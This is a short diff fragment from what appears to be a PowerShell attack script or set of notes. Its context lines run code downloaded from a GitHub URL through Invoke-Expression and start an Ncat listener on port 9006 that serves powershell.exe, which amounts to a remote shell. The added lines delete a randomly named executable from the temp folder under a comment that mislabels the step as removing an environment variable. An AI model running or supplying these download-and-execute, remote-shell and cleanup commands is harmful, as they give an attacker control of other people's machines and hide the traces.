@@ -11,4 +11,6 @@ Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubus
 
 Invoke-Ncat -ArgumentList "-l 9006 -v -ssl -e powershell.exe"
 
+# Remove Environment Variable
 
+PS> Remove-Item $env:temp\tIaSTpEXB.exe
